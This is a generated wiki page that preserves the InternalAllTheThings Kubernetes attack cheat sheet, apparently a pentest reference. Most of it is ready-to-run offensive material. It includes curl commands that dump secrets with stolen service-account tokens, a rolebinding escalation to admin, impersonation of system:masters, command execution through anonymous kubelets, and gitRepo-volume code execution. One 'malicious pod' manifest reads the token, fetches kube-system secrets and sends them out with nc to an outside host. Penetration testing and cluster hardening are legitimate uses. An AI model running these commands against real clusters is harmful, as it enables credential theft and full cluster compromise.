---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Kubernetes

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-containers-kubernetes` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/containers/kubernetes.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Kubernetes](../../topics/containers/kubernetes.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-containers-kubernetes |
| name | Kubernetes |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/containers/kubernetes.md |

## Preserved Source Material

````yaml
_body: "# Kubernetes\n\n> Kubernetes, often abbreviated as K8s, is an open-source container orchestration platform designed\
  \ to automate the deployment, scaling, and management of containerized applications. It was originally designed by Google,\
  \ and is now maintained by the Cloud Native Computing Foundation.\n\n## Summary\n\n- [Tools](#tools)\n- [Container Environment](#container-environment)\n\
  - [Information Gathering](#information-gathering)\n- [RBAC Configuration](#rbac-configuration)\n    - [Listing Secrets](#listing-secrets)\n\
  \    - [Access Any Resource or Verb](#access-any-resource-or-verb)\n    - [Pod Creation](#pod-creation)\n    - [Privilege\
  \ to Use Pods/Exec](#privilege-to-use-podsexec)\n    - [Privilege to Get/Patch Rolebindings](#privilege-to-getpatch-rolebindings)\n\
  \    - [Impersonating a Privileged Account](#impersonating-a-privileged-account)\n- [Privileged Service Account Token](#privileged-service-account-token)\n\
  - [Kubernetes Endpoints](#kubernetes-endpoints)\n- [Exploits](#exploits)\n    - [Accessible kubelet on 10250/TCP](#accessible-kubelet-on-10250tcp)\n\
  \    - [Obtaining Service Account Token](#obtaining-service-account-token)\n- [References](#references)\n\n## Tools\n\n\
  - [BishopFox/badpods](https://github.com/BishopFox/badpods) - A collection of manifests that will create pods with elevated\
  \ privileges.\n\n    ```ps1\n    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml\n\
  \    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml\n\
  \    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml\n \
  \   kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml\n\
  \    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml\n\
  \    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml\n\
  \    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml\n\
  \    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml\n\
  \    ```\n\n- [serain/kubelet-anon-rce](https://github.com/serain/kubelet-anon-rce) - Executes commands in a container on\
  \ a kubelet endpoint that allows anonymous authentication\n- [DataDog/KubeHound](https://github.com/DataDog/KubeHound) -\
  \ Kubernetes Attack Graph\n\n    ```ps1\n    # Critical paths enumeration\n    kh.containers().criticalPaths().count()\n\
  \    kh.containers().dedup().by(\"name\").criticalPaths().count()\n    kh.endpoints(EndpointExposure.ClusterIP).criticalPaths().count()\n\
  \    kh.endpoints(EndpointExposure.NodeIP).criticalPaths().count()\n    kh.endpoints(EndpointExposure.External).criticalPaths().count()\n\
  \    kh.services().criticalPaths().count()\n\n    # DNS services and port\n    kh.endpoints(EndpointExposure.External).criticalPaths().limit(local,1)\n\
  \    .dedup().valueMap(\"serviceDns\",\"port\")\n    .group().by(\"serviceDns\").by(\"port\")\n    ```\n\n- [Shopify/kubeaudit](https://github.com/Shopify/kubeaudit)\
  \ - Audit Kubernetes clusters against common security concerns\n- [aquasecurity/kube-bench](https://github.com/aquasecurity/kube-bench)\
  \ - Checks whether Kubernetes is deployed securely by running [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes/)\n\
  - [aquasecurity/kube-hunter](https://github.com/aquasecurity/kube-hunter) - Hunt for security weaknesses in Kubernetes clusters\n\
  - [armosec/kubescape](https://github.com/armosec/kubescape) - Automate Kubernetes cluster scans to identify security issues\n\
  - [kubesec.io](https://kubesec.io/) - Security risk analysis for Kubernetes resources\n- [katacoda.com](https://katacoda.com/courses/kubernetes)\
  \ - Learn Kubernetes using interactive broser-based scenarios\n\n## Container Environment\n\nContainers within a Kubernetes\
  \ cluster automatically have certain information made available to them through their [container environment](https://kubernetes.io/docs/concepts/containers/container-environment/).\
  \ Additional information may have been made available through the volumes, environment variables, or the downward API, but\
  \ this section covers only what is made available by default.\n\n### Service Account\n\nEach Kubernetes pod is assigned\
  \ a service account for accessing the Kubernetes API. The service account, in addition to the current namespace and Kubernetes\
  \ SSL certificate, are made available via a mounted read-only volume:\n\n```ps1\n/var/run/secrets/kubernetes.io/serviceaccount/token\n\
  /var/run/secrets/kubernetes.io/serviceaccount/namespace\n/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n```\n\nIf\
  \ the `kubectl` utility is installed in the container, it will use this service account automatically and will make interacting\
  \ with the cluster much easier. If not, the contents of the `token` and `namespace` files can be used to make HTTP API requests\
  \ directly.\n\n### Environment Variables\n\nThe `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT` environment variables\
  \ are automatically provided to the container. They contain the IP address and port number of the Kubernetes master node.\
  \ If `kubectl` is installed, it will use these values automatically. If not, the values can be used to determine the correct\
  \ IP address to send API requests to.\n\n```ps1\nKUBERNETES_SERVICE_HOST=192.168.154.228\nKUBERNETES_SERVICE_PORT=443\n\
  ```\n\nAdditionally, [environment variables](https://kubernetes.io/docs/concepts/services-networking/service/#discovering-services)\
  \ are automatically created for each Kubernetes service running in the current namespace when the container was created.\
  \ The environment variables are named using two patterns:\n\n- A simplified `{SVCNAME}_SERVICE_HOST` and `{SVCNAME}_SERVICE_PORT`\
  \ contain the IP address and default port number for the service.\n- A [Docker links](https://docs.docker.com/network/links/#environment-variables)\
  \ collection of variables named `{SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR}` for each port the service exposes.\n\
  \nFor example, all of the following environment variables would be available if a `redis-master` service were running with\
  \ port 6379 exposed:\n\n```ps1\nREDIS_MASTER_SERVICE_HOST=10.0.0.11\nREDIS_MASTER_SERVICE_PORT=6379\nREDIS_MASTER_PORT=tcp://10.0.0.11:6379\n\
  REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379\nREDIS_MASTER_PORT_6379_TCP_PROTO=tcp\nREDIS_MASTER_PORT_6379_TCP_PORT=6379\n\
  REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11\n```\n\n### Simulating `kubectl` API Requests\n\nMost containers within a Kubernetes\
  \ cluster won't have the `kubectl` utility installed. If running the [one-line `kubectl` installer](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)\
  \ within the container isn't an option, you may need to craft Kubernetes HTTP API requests manually. This can be done by\
  \ using `kubectl` _locally_ to determine the correct API request to send from the container.\n\n1. Run the desired command\
  \ at the maximum verbosity level using `kubectl -v9 ...`\n1. The output will include HTTP API endpoint URL, the request\
  \ body, and an example curl command.\n1. Replace the endpoint URL's hostname and port with the `KUBERNETES_SERVICE_HOST`\
  \ and `KUBERNETES_SERVICE_PORT` values from the container's environment variables.\n1. Replace the masked \"Authorization:\
  \ Bearer\" token value with the contents of `/var/run/secrets/kubernetes.io/serviceaccount/token` from the container.\n\
  1. If the request had a body, ensure the \"Content-Type: application/json\" header is included and send the request body\
  \ using the customary method (for curl, use the `--data` flag).\n\nFor example, this output was used to create the [Service\
  \ Account Permissions](#service-account-permissions) request:\n\n```powershell\n# NOTE: only the Authorization and Content-Type\
  \ headers are required. The rest can be omitted.\n$ kubectl -v9 auth can-i --list\nI1028 18:58:38.192352   76118 loader.go:359]\
  \ Config loaded from file /home/example/.kube/config\nI1028 18:58:38.193847   76118 request.go:942] Request Body: {\"kind\"\
  :\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\"\
  :{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\nI1028\
  \ 18:58:38.193912   76118 round_trippers.go:419] curl -k -v -XPOST  -H \"Accept: application/json, */*\" -H \"Content-Type:\
  \ application/json\" -H \"User-Agent: kubectl/v1.14.10 (linux/amd64) kubernetes/f5757a1\" 'https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews'\n\
  I1028 18:58:38.295722   76118 round_trippers.go:438] POST https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\
  \ 201 Created in 101 milliseconds\nI1028 18:58:38.295760   76118 round_trippers.go:444] Response Headers:\n...\n```\n\n\
  ## Information Gathering\n\n### Service Account Permissions\n\nThe default service account may have been granted additional\
  \ permissions that make cluster compromise or lateral movement easier.  \nThe following can be used to determine the service\
  \ account's permissions:\n\n```powershell\n# Namespace-level permissions using kubectl\nkubectl auth can-i --list\n\n# Cluster-level\
  \ permissions using kubectl\nkubectl auth can-i --list --namespace=kube-system\n\n# Permissions list using curl\nNAMESPACE=$(cat\
  \ \"/var/run/secrets/kubernetes.io/serviceaccount/namespace\")\n# For cluster-level, use NAMESPACE=\"kube-system\" instead\n\
  \nMASTER_URL=\"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\"\nTOKEN=$(cat \"/var/run/secrets/kubernetes.io/serviceaccount/token\"\
  )\ncurl \"${MASTER_URL}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\" \\\n  --cacert \"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"\
  \ \\\n  --header \"Authorization: Bearer ${TOKEN}\" \\\n  --header \"Content-Type: application/json\" \\\n  --data '{\"\
  kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"'${NAMESPACE}'\"\
  }}'\n```\n\n### Secrets, ConfigMaps, and Volumes\n\nKubernetes provides Secrets and ConfigMaps as a way to load configuration\
  \ into containers at runtime. While they may not lead directly to whole cluster compromise, the information they contain\
  \ can lead to individual service compromise or enable lateral movement within a cluster.\n\nFrom a container perspective,\
  \ Kubernetes Secrets and ConfigMaps are identical. Both can be loaded into environment variables or mounted as volumes.\
  \ It's not possible to determine if an environment variable was loaded from a Secret/ConfigMap, so each environment variable\
  \ will need to be manually inspected. When mounted as a volume, Secrets/ConfigMaps are always mounted as read-only tmpfs\
  \ filesystems. You can quickly find these with `grep -F \"tmpfs ro\" /etc/mtab`.\n\nTrue Kubernetes Volumes are typically\
  \ used as shared storage or for persistent storage across restarts. These are typically mounted as ext4 filesystems and\
  \ can be identified with `grep -wF \"ext4\" /etc/mtab`.\n\n### Privileged Containers\n\nKubernetes supports a wide range\
  \ of [security contexts](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) for container and pod\
  \ execution. The most important of these is the \"privileged\" [security policy](https://kubernetes.io/docs/concepts/policy/pod-security-policy/)\
  \ which makes the host node's devices available under the container's `/dev` directory. This means having access to the\
  \ host's Docker socket file (allowing arbitrary container actions) in addition to the host's root disks (which can be used\
  \ to escape the container entirely).\n\nWhile there is no official way to check for privileged mode from _within_ a container,\
  \ checking if `/dev/kmsg` exists will usually suffice.\n\n## RBAC Configuration\n\n### Listing Secrets\n\nAn attacker that\
  \ gains access to list secrets in the cluster can use the following curl commands to get all secrets in \"kube-system\"\
  \ namespace.\n\n```powershell\ncurl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/\n\
  curl -k -v -H \"Authorization: Bearer <jwt_token>\" -H \"Content-Type: application/json\" https://<master_ip>:6443/api/v1/namespaces/default/secrets\
  \ | jq -r '.items[].data'\n```\n\n### Access Any Resource or Verb\n\n```powershell\nresources:\n- '*'\nverbs:\n- '*'\n```\n\
  \n### Pod Creation\n\nCheck your right with `kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml`.\n\
  Then create a malicious pod.yaml file.\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: alpine\n  namespace: kube-system\n\
  spec:\n  containers:\n    - name: alpine\n      image: alpine\n      command: [\"/bin/sh\"]\n      args:\n        [\n  \
  \        \"-c\",\n          'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token\
  \ | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets;\
  \ } | nc -nv 192.168.154.228 6666; sleep 100000',\n        ]\n  serviceAccountName: bootstrap-signer\n  automountServiceAccountToken:\
  \ true\n  hostNetwork: true\n```\n\nThen `kubectl apply -f malicious-pod.yaml`\n\n### Privilege to Use Pods/Exec\n\n```powershell\n\
  kubectl exec -it <POD NAME> -n <PODS NAMESPACE> –- sh\n```\n\n### Privilege to Get/Patch Rolebindings\n\nThe purpose of\
  \ this JSON file is to bind the admin \"CluserRole\" to the compromised service account.\nCreate a malicious RoleBinging.json\
  \ file.\n\n```powershell\n{\n    \"apiVersion\": \"rbac.authorization.k8s.io/v1\",\n    \"kind\": \"RoleBinding\",\n   \
  \ \"metadata\": {\n        \"name\": \"malicious-rolebinding\",\n        \"namespaces\": \"default\"\n    },\n    \"roleRef\"\
  : {\n        \"apiGroup\": \"*\",\n        \"kind\": \"ClusterRole\",\n        \"name\": \"admin\"\n    },\n    \"subjects\"\
  : [\n        {\n            \"kind\": \"ServiceAccount\",\n            \"name\": \"sa-comp\"\n            \"namespace\"\
  : \"default\"\n        }\n    ]\n}\n```\n\n```powershell\ncurl -k -v -X POST -H \"Authorization: Bearer <JWT TOKEN>\" -H\
  \ \"Content-Type: application/json\" https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings\
  \ -d @malicious-RoleBinging.json\ncurl -k -v -X POST -H \"Authorization: Bearer <COMPROMISED JWT TOKEN>\" -H \"Content-Type:\
  \ application/json\" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret\n```\n\n### Impersonating a Privileged\
  \ Account\n\n```powershell\ncurl -k -v -XGET -H \"Authorization: Bearer <JWT TOKEN (of the impersonator)>\" -H \"Impersonate-Group:\
  \ system:masters\" -H \"Impersonate-User: null\" -H \"Accept: application/json\" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/\n\
  ```\n\n## Privileged Service Account Token\n\n```powershell\ncat /run/secrets/kubernetes.io/serviceaccount/token\ncurl -k\
  \ -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/\n```\n\n## Kubernetes\
  \ Endpoints\n\n```powershell\n# List Pods\ncurl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/default/pods/\n\
  \n# List secrets\ncurl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/\n\
  \n# List deployments\ncurl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/deployments\n\
  \n# List daemonsets\ncurl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/daemonsets\n\
  ```\n\n### cAdvisor\n\n```powershell\ncurl -k https://<IP Address>:4194\n```\n\n### Insecure API server\n\n```powershell\n\
  curl -k https://<IP Address>:8080\n```\n\n### Secure API Server\n\n```powershell\ncurl -k https://<IP Address>:(8|6)443/swaggerapi\n\
  curl -k https://<IP Address>:(8|6)443/healthz\ncurl -k https://<IP Address>:(8|6)443/api/v1\n```\n\n### etcd API\n\n```powershell\n\
  curl -k https://<IP address>:2379\ncurl -k https://<IP address>:2379/version\netcdctl --endpoints=http://<MASTER-IP>:2379\
  \ get / --prefix --keys-only\n```\n\n### Kubelet API\n\n```powershell\ncurl -k https://<IP address>:10250\ncurl -k https://<IP\
  \ address>:10250/metrics\ncurl -k https://<IP address>:10250/pods\n```\n\n### kubelet (Read only)\n\n```powershell\ncurl\
  \ -k https://<IP Address>:10255\nhttp://<external-IP>:10255/pods\n```\n\n## Exploits\n\n### Accessible kubelet on 10250/TCP\n\
  \n**Requirements**:\n\n- `--anonymous-auth`: Enables anonymous requests to the Kubelet server\n\n**Exploit**:\n\n- Getting\
  \ pods: `curl -ks https://worker:10250/pods`\n- Run commands: `curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container}\
  \ -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'`\n\n### Obtaining Service Account Token\n\nToken is\
  \ stored at `/var/run/secrets/kubernetes.io/serviceaccount/token`\n\nUse the service account token:\n\n- on `kube-apiserver`\
  \ API: `curl -ks -H \"Authorization: Bearer <TOKEN>\" https://master:6443/api/v1/namespaces/{namespace}/secrets`\n- with\
  \ kubectl: `kubectl --insecure-skip-tls-verify=true --server=\"https://master:6443\" --token=\"<TOKEN>\" get secrets --all-namespaces\
  \ -o json`\n\n### Create gitRepo Volumes to Execute Code\n\n**Requirements**:\n\n- [`gitRepo`](https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo)\
  \ volume type enabled\n- `create` rights on pods\n\n**Exploit**:\n\n```yml\napiVersion: v1\nkind: Pod\nmetadata:\n  name:\
  \ test-pd\nspec:\n  containers:\n  - image: alpine:latest\n    command: [\"sleep\",\"86400\"]\n    name: test-container\n\
  \    volumeMounts:\n    - mountPath: /gitrepo\n      name: gitvolume\n  volumes:\n  - name: gitvolume\n    gitRepo:\n  \
  \    directory: g/.git\n      repository: https://github.com/raesene/repopodexploit.git\n      revision: main\n```\n\n##\
  \ References\n\n- [Attacking Kubernetes through Kubelet - Withsecure Labs- 11 January, 2019](https://labs.withsecure.com/publications/attacking-kubernetes-through-kubelet)\n\
  - [kubehound - Attack Reference](https://kubehound.io/reference/attacks/)\n- [KubeHound: Identifying attack paths in Kubernetes\
  \ clusters - Datadog - October 2, 2023](https://securitylabs.datadoghq.com/articles/kubehound-identify-kubernetes-attack-paths/)\n\
  - [Fun With GitRepo Volumes - Rory McCune - JULY 10TH, 2024](https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/)\n\
  - [Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)\n\
  - [Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2)\n\
  - [Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3)\n\
  - [Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)\n\
  - [Kubernetes Pod Privilege Escalation](https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation)"
_relative_path: containers/kubernetes.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/containers/kubernetes.md
````
